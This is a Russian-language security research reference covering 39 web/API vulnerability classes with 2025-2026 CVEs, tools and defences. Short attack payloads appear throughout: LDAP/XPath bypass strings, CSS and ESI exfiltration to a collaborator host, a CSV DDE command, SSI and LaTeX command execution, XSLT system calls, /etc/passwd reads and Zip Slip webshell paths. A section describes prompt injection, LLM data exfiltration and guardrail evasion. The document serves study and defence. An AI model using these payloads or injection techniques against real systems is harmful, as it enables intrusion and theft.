# Web/API Security: исследовательский справочник — часть 2 (2025-2026)

> Продолжение `research.md`. Оставшиеся 39 категорий из 64. Парный документ к `checklists-part2.md`. «Зачем и откуда»: impact, актуальные техники 2025-2026, свежие CVE, источники.

## TL;DR части 2
- **Самый горячий свежак:** SAML signature-wrapping вернулся кластером критов через parser-differential (PortSwigger «The Fragile Lock», дек-2025; ruby-saml/samlify CVE), CSPT оформился в самостоятельный класс (CSPT2CSRF/CSPT2XSS, Doyensec), ORM Leak — новый класс от elttam (Black Hat EU «ORMageddon») + Django CVE-2025-64459 (SQLi через ORM, 9.1), reverse-proxy path confusion дал unauth auth-bypass в PAN-OS (CVE-2025-0108), prompt injection — №1 в OWASP Top 10 for LLM 2025.
- **Supply chain** (dependency confusion / typosquatting) — массовые инциденты 2025: Shai-Hulud 2.0, GhostAction (3325 секретов), компрометация chalk/debug (миллиарды загрузок).
- **Стабильная классика** (Clickjacking, CSV, Tabnabbing, LDAP/XPath, SSI/ESI, Type Juggling, Zip Slip) меняется мало, но регулярно встречается и хорошо работает в chain'ах.

---

## 1. API Key Leaks
Утечка ключей — частый и быстрый источник критов: ключ в JS-бандле, git-истории, мобильном приложении или Wayback напрямую даёт доступ к биллингу, PII, отправке почты/SMS или административным операциям. Главное правило для bug bounty: **валидировать ключ и его scope перед репортом** (минимальным безопасным запросом, без злоупотребления) — невалидный/просроченный ключ обычно не платится, а impact определяется именно правами ключа. Триаж типа ключа — через `keyhacks`. IOC: коммиты с секретами, последующая ротация. Инструменты обнаружения: trufflehog, gitleaks, secretmagpie. Защита — secret scanning в CI, scoped/short-lived ключи, вынос секретов из фронта в backend-proxy.

## 2. Brute Force & Rate Limit
Отсутствие или обходимость rate-limit ведёт к захвату аккаунтов (перебор паролей/OTP/reset-токенов) и злоупотреблению логикой (промокоды, инвайты). Типичные обходы: ротация `X-Forwarded-For`/`X-Real-IP` (если лимит по IP и доверяет заголовку), сброс счётчика сменой регистра/добавлением точки/`%00` в логин, distributed-перебор. **Главный свежий множитель — single-packet attack** для обхода лимита попыток на числовой OTP (см. §16 ч.1): десятки попыток «в один пакет» проскакивают мимо счётчика. Защита — lockout/exponential backoff per account+IP, CAPTCHA, длинные случайные токены.

## 3. Clickjacking
Обычно low severity сам по себе; импакт появляется при наличии чувствительного действия в один клик (смена email, удаление, OAuth-consent). Корень — отсутствие `frame-ancestors`/`X-Frame-Options`. В 2025 актуальная подкатегория — **«double-clickjacking»** (Paulos Yibelo, 2025): обход защит, рассчитанных на одиночный фрейм/клик, за счёт тайминга двойного клика и подмены окна между нажатиями. Защита — `frame-ancestors 'none'`/`'self'` + `SameSite` cookies.

## 4. Client Side Path Traversal (CSPT)
Оформился в самостоятельный класс благодаря исследованию Doyensec (Maxence Schmitt, «Exploiting Client-Side Path Traversal — CSRF is Dead, Long Live CSRF», OWASP Global AppSec 2024) и whitepaper CSPT2CSRF. Суть: фронт строит путь к API из пользовательского значения (param/hash/stored), `../` после нормализации уводит `fetch` на другой эндпоинт, а браузер сам прикрепляет cookies/CSRF-токены/JWT — то есть **обходятся существующие CSRF-защиты**. Импакт зависит от достижимого sink'а: DELETE-CSRF открывает мощные векторы (удаление MFA админа), POST/PUT — изменение состояния. Свежие CVE: **Grafana OSS CVE-2025-4123/6023** (traversal в `/public/plugins/` → загрузка attacker-controlled плагина, chain с open-redirect; при Image Renderer → SSRF), Mattermost CVE-2023-45316/6458. Инструменты: Doyensec CSPTBurpExtension, Gecko (Vitor Falcao), CSPTPlayground. Источники: Doyensec blog (включая «Bypassing File Upload Restrictions To Exploit CSPT», 9 янв 2025), HackTricks. Защита — не строить пути из ввода, allowlist эндпоинтов.

## 5. CRLF Injection
Инъекция `%0d%0a` в параметр, попадающий в заголовок ответа, ведёт к HTTP response splitting, header injection (`Set-Cookie`, `Location`), reflected XSS через внедрённое тело, cache poisoning и log injection. Обходы фильтров — варианты кодирования (`%0a`/`%0d`/overlong `%E5%98%8A%E5%98%8D`); ряд бэкендов и nginx-sink'ов принимают декодированные `\r\n` (особенно в небезопасных переменных `$uri`/`$arg_*` — см. §28). В эпоху HTTP/2 классический response splitting реже, но header injection в проксируемых заголовках и CRLF в reverse-proxy конфигах остаются актуальны. Инструменты: crlfuzz, nuclei. Защита — strip CR/LF, не отражать ввод в заголовки.

## 6. CSS Injection
Даже без JS «чистая» CSS-инъекция позволяет эксфильтровать данные из DOM-атрибутов: селекторы атрибутов (`input[value^="a"]{background:url(//collab/a)}`) сливают значение посимвольно — классически крадут CSRF-токены и секреты, что в chain даёт account takeover. Blind-варианты — `@import`, font-ligatures, рекурсивный `@import` для последовательного слива. Особенно опасно там, где CSP отсутствует, а секреты лежат в `value`/data-атрибутах. Связка с CSPT (§4) и XS-Leaks (§37) — отдельное направление research 2025. Защита — CSP, санитизация стилей, не хранить секреты в атрибутах.

## 7. CSV Injection (Formula Injection)
Поле, попадающее в экспортируемый CSV/XLSX и начинающееся с `=`,`+`,`-`,`@`,Tab,CR, интерпретируется как формула при открытии жертвой. Импакт: эксфильтрация (`=HYPERLINK`, `=WEBSERVICE`) и RCE через DDE (`=cmd|'/c calc'!A1`) при подтверждении пользователем (современные Excel показывают предупреждение, но социнженерия работает). Severity варьируется — часто рассматривается как «требует действия жертвы». Защита — префиксовать опасные стартовые символы `'`, экранировать при генерации файла.

## 8. CVE Exploits
Мета-категория, не уязвимость: дисциплина «зафингерпринтить версию → найти CVE/PoC → проверить применимость → аккуратно эксплуатировать». Ключ — точная версия (заголовки, favicon-hash, статичные файлы, CHANGELOG) и приоритет по **CISA KEV** (что реально эксплуатируется). Инструменты: nuclei, searchsploit, Metasploit, NVD/GHSA, Shodan. Для bug bounty важно: n-day на устаревшем компоненте — валидная находка, но проверяй scope (часто known-CVE вне области). Защита — патч-менеджмент, мониторинг KEV, virtual patching.

## 9. DNS Rebinding
TOCTOU между DNS-резолвингом (для валидации) и фактическим запросом: домен с TTL=0 чередует публичный IP → `127.0.0.1`/internal, проходя allowlist на «хорошем» ответе и попадая на внутренний при запросе. Цели — внутренние API/IoT без проверки `Host`, и cloud metadata (см. §4 ч.1, Craft CMS CVE-2025-68437/bypass). Инструменты: Singularity of Origin (NCC), whonow. Защита — валидация `Host`, DNS pinning, резолв+запрос одним шагом, egress-фильтрация.

## 10. DOM Clobbering
Когда санитайзер режет `<script>`, но пропускает `id`/`name`, атакующий перезаписывает JS-глобалы/свойства именованными элементами (`<a id=x>`, вложенные `<form id=x><input name=y>`, коллекции через дублирующиеся `id`) — и через это раскручивает XSS или CSP-bypass. Свежий пример — **CVE-2025-1647** (Bootstrap 3 Tooltip/Popover, обход `sanitizeHtml` через clobbering → XSS); PortSwigger показал clobbering `script.src`/конфига для CSP-bypass. Инструмент: DOM Invader (clobbering-режим). Защита — явное объявление переменных, namespacing, `Object.freeze`, санитайзер, стрипающий `id`/`name`, Trusted Types.

## 11. Denial of Service
В bug bounty чаще всего out-of-scope или принимается как «вероятность» без реального обрушения. Классы: алгоритмическая сложность (ReDoS §27, hash-collisions), декомпрессия (zip/gzip-bomb, XML billion-laughs entity expansion), ресурсное истощение (большие/глубоко вложенные payloads, GraphQL depth/alias §19 ч.1). Детект — масштабирование времени ответа на graduated-нагрузке, не до отказа. Защита — лимиты размера/глубины/таймаутов, ограничение сложности, RE2, rate limiting, декомпрессия с лимитом. *Тестировать предельно осторожно и только в scope.*

## 12. Dependency Confusion
Атака на резолюцию пакетов: публичный пакет с именем внутреннего перехватывает установку из-за дефолтного приоритета реестра/версии. 2025 — год supply chain: **Shai-Hulud 2.0**, **GhostAction** (5 сент 2025, GitGuardian: 327 пользователей, 817 репо, эксфильтрация 3325 секретов — PyPI/npm/DockerHub токены), компрометация maintainer-аккаунта и инъекция в 18 популярных npm-пакетов (chalk, debug — миллиарды загрузок), termncolor/colorinal (PyPI). Классика — pytorch torchtriton (2022). Триггеры: install-time (postinstall/setup.py) и runtime. **Этичное тестирование в bug bounty** — только канареечный пакет с безопасным OAST-beacon и более высокой версией, без вредоносной нагрузки, строго в рамках программы. Инструменты: confused, snync, Socket.dev. Защита (по консенсусу): namespace ownership (застолбить имена публично как stub), единый приватный индекс/scoped registry, пин версий, cooldown новых пакетов. Источники: GitGuardian, Netlas, thebrightbyte playbook.

## 13. Encoding Transformations
Не уязвимость, а универсальный байпас-тулкит, питающий все инъекционные классы: URL/double-URL, Unicode-нормализация NFKC, overlong UTF-8, fullwidth (`／`,`＜`), HTML-entities, base64/hex/mixed-case. Корень эксплуатации — фронт/WAF декодирует иначе, чем бэкенд (parser differential на уровне кодировок). Связан с Ghost Bits (§9 ч.1) и JSON-based SQLi (§2 ч.1). Инструменты: Hackvertor (Burp), CyberChef. Защита — канонизация до валидации, единое декодирование во всей цепочке.

## 14. External Variable Modification
PHP-специфичный класс: `extract($_REQUEST)`, `import_request_variables`, `$$var`, register_globals-стиль позволяют перезаписать внутренние переменные запросными параметрами (`?authenticated=1`, `?isAdmin=1`) до проверки → auth bypass/logic flaw, перезапись include-путей. Встречается в легаси-PHP. Защита — не применять `extract()`/динамические переменные к пользовательскому вводу, явное присваивание.

## 15. Google Web Toolkit (GWT)
Нишевый, но недооценённый: GWT-RPC сериализация раскрывает методы и параметры, которых нет в видимом API. Recon по `*.nocache.js`/`*.cache.html`/`X-GWT-Permutation`, парсинг RPC-payload и serialization policy (`.gwt.rpc`) выявляет скрытые методы → IDOR, инъекции в нижележащие вызовы, manipulation типов. Инструмент: GWTMap. Защита — серверная авторизация на каждый RPC-метод, не полагаться на «скрытость».

## 16. HTTP Parameter Pollution (HPP)
Дублирование параметра (`?id=1&id=2`) обрабатывается серверами по-разному (первый/последний/массив/конкатенация), что даёт WAF-bypass (нагрузка во втором вхождении, если WAF смотрит первое), обход логики/авторизации за счёт расхождения парсинга фронт↔бэк, а client-side HPP (инъекция `&`/`%26`) портит генерируемые ссылки. Хорошо комбинируется с другими инъекциями для обхода фильтров. Защита — единообразный парсинг, явная валидация, reject дубликатов.

## 17. Headless Browser
Категория про атаку на server-side рендеринг (HTML→PDF, скриншот, preview через puppeteer/Chromium): XSS в рендеримом контенте даёт выполнение в контексте рендерера → local file read (`<iframe src="file:///etc/passwd">`), SSRF (`<img src="http://169.254.169.254/...">`), утечку в итоговый PDF. Пересекается с SSRF (§4 ч.1) и SSTI (§5 ч.1); ср. pandoc CVE-2025-51591. Защита — не запускать с `--no-sandbox`, изоляция рендерера, блок `file://`/internal, таймауты, запрет внешних ресурсов.

## 18. Hidden Parameters
Недокументированные параметры (`debug=true`, `admin=1`, `source=true`, `test=1`) меняют поведение и часто открывают debug-раскрытие, privilege escalation или служат входом для Mass Assignment (§22 ч.1) и ORM Leak (§25). Обнаружение — Arjun, Param Miner, x8 + wordlists и грепинг JS. Высокий ROI как разведывательный шаг перед другими классами. Защита — allowlist принимаемых параметров, отключить debug в проде.

## 19. Insecure Management Interface
Экспонированные админ-панели и консоли — стабильно высокий impact: Spring Boot Actuator (`/env`, `/heapdump` со секретами, `/gateway` → RCE-цепочки), Jolokia/MBean, Tomcat Manager, Jenkins, Kibana, phpMyAdmin. Recon — фаззинг типовых путей + Shodan/Censys, нестандартные порты; часто работают default creds. Инструменты: nuclei, ffuf, feroxbuster. Защита — ограничение по IP/VPN/auth, отключить чувствительные actuator-эндпоинты, сменить дефолты.

## 20. Insecure Randomness
Предсказуемые токены (reset, session, OTP, CSRF, invite) из слабого PRNG (`Math.random()`, `mt_rand()`, time-seeded, инкремент) позволяют предсказать токен жертвы → ATO. Детект — сбор множества токенов и анализ энтропии/последовательности (Burp Sequencer). Защита — CSPRNG (`secrets`, `crypto.randomBytes`, `SecureRandom`), достаточная длина, не на основе времени.

## 21. Insecure Source Code Management (.git/.svn leaks)
Экспонированный `/.git/` (проверка `/.git/HEAD`) позволяет полностью выкачать репозиторий (git-dumper, GitTools Dumper/Extractor, dvcs-ripper) — исходники, секреты, история коммитов с удалёнными ключами. `.DS_Store` (ds_store_exp) раскрывает листинг директорий; аналогично `.svn/`, `.hg/`, `.bzr/`. Очень частая и быстрая находка. Инструменты: git-dumper, GitTools, nuclei (exposures). Защита — блокировать dot-файлы/директории на веб-сервере, не деплоить VCS-каталоги.

## 22. Java RMI
Экспонированный RMI registry (1099) и JMX дают мощные векторы: deserialization через RMI (передача gadget-объекта, см. §11 ч.1), JMX MLet → загрузка удалённого MBean → RCE, default/no-auth JMX, remote method guessing. Инструменты: remote-method-guesser (rmg), BaRMIe, ysoserial, nmap rmi-scripts. Защита — не экспонировать RMI/JMX наружу, JMX auth+TLS, deserialization-фильтры.

## 23. LDAP Injection
Инъекция в LDAP-фильтр даёт auth bypass (`*)(uid=*))(|(uid=*`, `*)(|(password=*))`), wildcard-перечисление (`*`) и blind boolean-эксфильтрацию атрибутов посимвольно. Встречается в корпоративных приложениях с LDAP/AD-аутентификацией. Защита — экранирование LDAP-метасимволов, параметризация фильтров, валидация.

## 24. LaTeX Injection
Инъекция в LaTeX-компиляцию (генераторы PDF, научные/отчётные сервисы): file read (`\input{/etc/passwd}`, `\lstinputlisting`, `\verbatiminput`), запись файлов и **RCE при включённом shell-escape** (`\immediate\write18{id}`). Импакт — от чтения файлов до полного RCE. Защита — отключить `--shell-escape`, sandbox-компиляция (контейнер/restricted-mode), allowlist команд, таймаут.

## 25. ORM Leak
Новый класс от elttam (Alex Brown, серия «plORMbing your Django/Prisma ORM» и «Leaking More Than You Joined For», Black Hat EU «ORMageddon»; James Kettle назвал Prisma-часть «beautiful example of abusing framework features to make timing attacks that work in the wild»). Корень: приложение даёт пользователю контролировать **имя поля и/или оператор** фильтра (`filter(**request.data)`, Prisma `where: req.query.filter`), и ORM-разработчик не ограничил, какие поля queryable. Техники: Django field-lookups (`password__startswith`, `__regex`, JSONField `__has_key`), boolean-oracle посимвольно, relational filtering (пивот через one-to-one/many-to-many к чувствительным полям связанных таблиц), error-based через ReDoS-предикат на MySQL, калибровка под collation БД. Свежие CVE: **Django CVE-2025-64459** (5 ноя 2025; `_connector`/`_negated` в `Q(**params)`/`filter(**request.GET)` → полноценная SQLi, CISA ADP CVSS 9.1; fixed 4.2.26/5.2.8), Authentik CVE-2024-42490, Ransack (Ruby). Инструменты: plormber (time-based), elttam semgrep-rules (Django/Prisma/Beego/EF). По словам elttam: на фоне редеющей SQLi всё чаще встречаются приложения, непреднамеренно дающие фильтровать по чувствительным полям. Защита — allowlist queryable-полей (никогда password/token), server-controlled query logic, не разворачивать пользовательский dict в ORM-вызов.

## 26. Prompt Injection (LLM)
№1 в **OWASP Top 10 for LLM Applications 2025** (LLM01). Direct — override инструкций/смена роли/извлечение system prompt; **indirect** — инструкции спрятаны во внешнем контенте (web/PDF/email/резюме), который попадает в контекст через RAG или tool-call (Greshake et al. 2023; «goal hijacking»). В агентных системах главный импакт — **abuse of tool-calls** (действия от имени пользователя, эксфильтрация данных через markdown-image/ссылку на свой домен). Обход guardrail — base64/emoji/multilingual-энкодинг и character-injection (Hackett et al., «Bypassing LLM Guardrails», LLMSEC 2025: и character injection, и алгоритмический AML-evasion ломают детекторы). Таксономии: CrowdStrike classes (overt/indirect), Arcanum Prompt Injection Taxonomy 1.5 (Jason Haddix; измерения intents/techniques/evasions/inputs). Инструменты: garak, PromptFoo. Защита (defense-in-depth, OWASP LLM01:2025 + NIST AI RMF GenAI Profile): разделение данных/инструкций (spotlighting), least-privilege для tool-calls + human-in-the-loop на чувствительных действиях, фильтрация выходного канала (no auto-fetch), санитизация внешнего контента. Полное предотвращение jailbreak требует изменений на уровне обучения модели — на уровне приложения гарантий нет.

## 27. Regular Expression (ReDoS)
Catastrophic backtracking в regex с nested quantifiers (`(a+)+`, `(.*)*`) или перекрытием альтернатив (`(a|a)*`) при near-match строке с ломающим символом в конце даёт экспоненциальное время → DoS одним запросом. Вектор — серверная regex по пользовательскому вводу (валидация email/URL, поиск) или пользовательские regex. Также используется как error-oracle в ORM Leak (§25). Инструменты: regexploit, recheck. Защита — RE2 (линейная сложность), атомарные/possessive-группы, таймаут на матч, лимит длины ввода.

## 28. Reverse Proxy Misconfigurations
Архитектура «auth на прокси → проксирование на бэк с другим поведением» системно порождает header smuggling и path confusion. Ключевые техники: **nginx alias traversal** (нет завершающего слеша в `location`/`alias` → `/assets../config.php`), location-matching нюансы (добавление байта `\x85`/`%85` ломает `location = /admin`), CRLF в небезопасных переменных, `proxy_pass` без слеша (`/api../` → traversal к бэку). Флагманский кейс 2025 — **PAN-OS CVE-2025-0108** (Assetnote): расхождение нормализации nginx↔Apache↔PHP позволяло сбросить `X-pan-AuthCheck` и через internal redirect выполнить скрытый PHP-скрипт = unauth auth-bypass на management-интерфейсе. Историческая база — Orange Tsai (BH 2018, «Breaking Parser Logic»). Тесно связано с Request Smuggling (§19 ч.1). Инструменты: bypass-url-parser (laluka), Kyubi, ffuf. Защита — trailing slash в `location`/`alias`, единая нормализация фронт↔бэк, очистка `X-*`/hop-by-hop заголовков, whitelisting IP для management.

## 29. SAML Injection
SAML-баги дают полный auth-bypass (вход как произвольный/админ-пользователь) — топ по impact в enterprise SSO. Классика — **XML Signature Wrapping (XSW)**: добавить unsigned-assertion рядом с подписанным и заставить логику читать его (SAML Raider реализует 8 техник XSW). Возрождение 2025 — **parser differential**: ruby-saml использует два парсера (ReXML и Nokogiri), которые строят разные деревья из одного XML, что заново открывает signature wrapping. Кластер CVE: **CVE-2025-25291/25292** (signature wrapping), **CVE-2025-25293** (DoS на сжатых сообщениях), и incomplete-fix **CVE-2025-66567** (namespace handling, CVSS 10.0) + **CVE-2025-66568** (fixed в ruby-saml 1.18.0); **samlify CVE-2025-47949** (Node, >200K weekly downloads, CWE-347). PortSwigger «The Fragile Lock» (дек-2025) демонстрирует **Golden SAML Response** через libxml2 canonicalization: подпись пустой строки переиспользуется для произвольного Response (затронуты ruby-saml 1.12.4, php-saml, xmlseclibs; **не** затронуты XMLSec Library и Shibboleth xmlsectool). Также: comment-injection в NameID (старый, текст после `<!---->` теряется при канонизации), отсутствие проверки Audience/Recipient/времени, XXE в SAML. Инструмент: Burp SAML Raider. Защита — один XML-парсер, schema hardening + `disallow-doctype`, подпись всего assertion с проверкой ссылок, проверка Audience/Recipient/NotOnOrAfter, обновление библиотек.

## 30. SSI / ESI Injection
**SSI**: в `.shtml`/Apache `mod_include` или отражённом HTML — `<!--#exec cmd="id"-->` (RCE), `<!--#include virtual=...-->`, `<!--#echo var=...-->`. **ESI** (edge-side includes у Varnish/Akamai/Fastly/Squid): `<esi:include src="http://collab/"/>` даёт SSRF, внедрённый ESI из пользовательского ввода → XSS/обход HttpOnly, `<esi:debug/>` раскрывает данные. ESI-injection (Louis Dion-Marcil, GoSecure, BH 2018) актуальна там, где кэш доверяет ESI-тегам в ответе бэкенда. Защита — не обрабатывать SSI/ESI из пользовательского ввода, отключить `exec`, ограничить `esi:include` доверенными источниками.

## 31. Tabnabbing (Reverse Tabnabbing)
`target="_blank"` без `rel="noopener noreferrer"` даёт открытой странице доступ к `window.opener` → переписать `window.opener.location` на фишинг (пользователь возвращается на «подменённую» исходную вкладку). Современные браузеры по умолчанию применяют `noopener` для `_blank`, что снижает актуальность, но старые клиенты и явные `window.open` без noopener остаются. Обычно low severity (фишинг-вектор). Защита — `rel="noopener noreferrer"` на всех `_blank`.

## 32. Type Juggling
PHP loose comparison (`==`): magic hashes вида `0e\d+` сравниваются как равные (`"0e123" == "0e456"` → оба «0»), `strcmp(array,"str")` → NULL → `NULL == 0` истинно, `in_array` без strict — всё это даёт auth-bypass при сравнении паролей/хешей/токенов, особенно через JSON-API с типизированным вводом (`{"password": true/0}`). **Важно про PHP 8**: поведение `0 == "abc"` изменено — теперь **false** (строка больше не приводится к 0), поэтому `0=="string"`-байпасы не работают, но magic-hash (`0e...`) и array-tricks сохраняются. Защита — строгое сравнение `===`/`hash_equals()`, проверка типов, не сравнивать секреты через `==`.

## 33. Upload Insecure Files
Высокий impact (часто прямой RCE через webshell). Обходы комбинируют: альтернативные расширения (`.phtml`/`.php5`/`.pht`/`.phar`), double extension, Content-Type spoof, magic-bytes (`GIF89a;` + код), null-byte (легаси), регистр/спецсимволы/trailing dots, **.htaccess override** (`AddType ... .jpg`), полиглоты и **PHP в IDAT-чанке PNG** (переживает resize через `imagecopyresized`/`imagecopyresampled`), ImageMagick-эксплойты (ImageTragick) при server-side обработке, path-traversal в имени файла (см. Zip Slip §39). Подтверждение — выполнение по URL (`uploads/shell.php?cmd=id`). Базовый материал — PortSwigger Web Security Academy, OWASP Unrestricted File Upload, Intigriti guide (май 2025), HackTricks. Защита — allowlist расширений + magic-bytes + ре-кодирование, рандомные имена, хранение вне webroot, отключение выполнения скриптов в upload-дире, forced download через CDN.

## 34. Virtual Hosts (vhost enumeration)
На одном IP могут хоститься vhosts, отсутствующие в публичном DNS (internal/staging/admin). Фаззинг `Host`-заголовка (`ffuf -H "Host: FUZZ.target" -fs <baseline>`, gobuster vhost, VHostScan) выявляет скрытые приложения с потенциально слабой защитой → расширение поверхности атаки. Часто первый шаг к доступу к внутренним панелям (§19). Защита — default-vhost 404/403, не хостить internal на публичном IP без сетевого ограничения.

## 35. Web Sockets (CSWSH)
**Cross-Site WebSocket Hijacking**: если WS-handshake опирается только на cookies и не проверяет `Origin` и не несёт CSRF-токен, attacker-страница открывает `wss://target` с cookies жертвы и читает/шлёт сообщения — функциональный эквивалент CSRF + чтения данных. Дополнительно: message tampering (инъекции в WS-канал минуют HTTP-WAF) и отсутствие auth на уровне сообщений. Инструменты: Burp WebSocket history/Repeater, ws-harness. Защита — валидация `Origin` на handshake, CSRF-токен в апгрейд-запросе, аутентификация/авторизация на уровне сообщений, не доверять WS-вводу.

## 36. XPATH Injection
Инъекция в XPath-запрос (приложения с XML-хранилищем): auth bypass (`' or '1'='1`), blind boolean-эксфильтрация посимвольно (`substring(//user[1]/password,1,1)='a'`), перечисление структуры (`count()`, `name()`, `string-length()`). Реже SQLi, но там, где данные в XML — рабочий вектор. Инструмент: xcat (автоматизация blind XPath). Защита — параметризованный/precompiled XPath с переменными, экранирование, валидация.

## 37. XS-Leaks
Класс side-channel-атак, выводящих cross-origin информацию (logged-in статус, наличие результата поиска, user-id) в обход Same-Origin Policy. Техники: **frame counting** (`window.open(target).length` — число фреймов выдаёт состояние), **timing** (cache vs no-cache, существование пользователя), **error events** (`img.onload`/`onerror`, `<script>`/`<link>`), **CSP redirect detection** (CSP на своей странице блокирует → был редирект), **postMessage** broadcast, и новые варианты 2025 (**CSS injection XS-Leaks**, focus-события для проба ID). Корень — в дизайне веба (взаимодействие фич), поэтому защиты — opt-in заголовки. Источники: XS-Leaks Wiki (xsleaks.dev), MDN, PentesterLab. Защита — `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy`, **Fetch Metadata** (`Sec-Fetch-*`), единообразные ответы (uniform 404, padding размера, стабильные редиректы), `SameSite` cookies.

## 38. XSLT Injection
Инъекция в XSLT-трансформацию: определение движка (`system-property('xsl:version')`), file read (`unparsed-text('/etc/passwd')`, `document('/etc/passwd')`), SSRF (`document('http://...')`), и **RCE через extension functions** (PHP `php:function('system','id')`, Java/.NET) при их включённости. Импакт — от чтения файлов до RCE. Защита — отключить extension functions и `document()`/external, sandbox-процессор, обновление libxslt/Saxon.

## 39. Zip Slip
Path-traversal при распаковке архивов (ZIP/TAR/JAR): записи с именами `../../../../var/www/html/shell.php` пишутся вне директории извлечения → webshell в webroot, перезапись cron/`authorized_keys`/конфигов → RCE. Также symlink-варианты в TAR и Windows `..\\`. Класс описан Snyk (2018), но регулярно даёт криты: **CVE-2024-57726** (SimpleHelp — admin-загруженные ZIP с `../` пишут вне корня; внесён в CISA KEV, янв 2025), **CVE-2024-13059** (AnythingLLM via multer). Инструменты: evilarc, slipit. Защита — канонизация и проверка, что итоговый путь внутри целевой директории, отклонять `../`/абсолютные пути в именах записей.

---

## Caveats (часть 2)
- **CVE 2025-2026** (ruby-saml/samlify, Grafana CSPT, Django ORM CVE-2025-64459, Bootstrap CVE-2025-1647, PAN-OS CVE-2025-0108, SimpleHelp CVE-2024-57726) сверяйте с NVD/GHSA/вендорскими advisory перед использованием в отчёте — версии/статусы могли измениться.
- **Suммы и масштабы инцидентов supply chain** (GhostAction 3325 секретов, chalk/debug «миллиарды загрузок») приведены по источникам (GitGuardian, Netlas) для иллюстрации, не как гарантия.
- **PHP 8 type juggling**: проверяйте версию PHP — поведение `==` менялось, и часть классических байпасов на новых версиях не сработает.
- **Browser-зависимые классы** (Tabnabbing, XS-Leaks, Clickjacking, CSWSH) зависят от версии и настроек браузера и наличия opt-in заголовков на цели; современные дефолты часто частично митигируют.
- **Деструктив/нагрузка**: RCE-векторы (LaTeX `\write18`, upload-шеллы, RMI/JMX, XSLT extensions), DoS (ReDoS, decompression bombs), supply-chain и prompt-injection тесты — только в авторизованном scope и максимально безопасными пробниками (OAST/канарейки), без вредоносной нагрузки и mass-операций.
- Вместе с `research.md` (24 категории) этот документ покрывает все 64 категории PayloadsAllTheThings.

## Ключевые источники (часть 2)
- **PayloadsAllTheThings** — github.com/swisskyrepo/PayloadsAllTheThings
- **PortSwigger — The Fragile Lock (SAML bypass)** — portswigger.net/research/the-fragile-lock
- **ruby-saml releases / advisories** — github.com/SAML-Toolkits/ruby-saml/releases
- **Doyensec — CSPT2CSRF whitepaper** — doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf
- **Doyensec — CSPT file upload** — blog.doyensec.com/2025/01/09/cspt-file-upload.html
- **elttam — ORM Leak (Leaking More Than You Joined For)** — elttam.com/blog/leaking-more-than-you-joined-for
- **Django CVE-2025-64459 разбор** — hiddeninvestigations.net/blog/django-cve-2025-64459-critical-sql-injection-in-the-orm-explained
- **Assetnote — PAN-OS path confusion (CVE-2025-0108)** — assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os
- **nginx alias traversal** — dev.to/blue_byte/path-traversal-via-alias-misconfiguration-in-nginx-3pbg
- **OWASP Top 10 for LLM 2025 — Prompt Injection** — genai.owasp.org/llmrisk/llm01-prompt-injection/
- **Bypassing LLM Guardrails (LLMSEC 2025)** — aclanthology.org/2025.llmsec-1.8/
- **Dependency confusion / supply chain 2025** — blog.gitguardian.com/dependency-confusion-attacks/ , netlas.io/blog/supply_chain_attack/
- **File upload advanced guide (Intigriti)** — intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads
- **XS-Leaks Wiki** — xsleaks.dev
- **HackTricks** — book.hacktricks.xyz
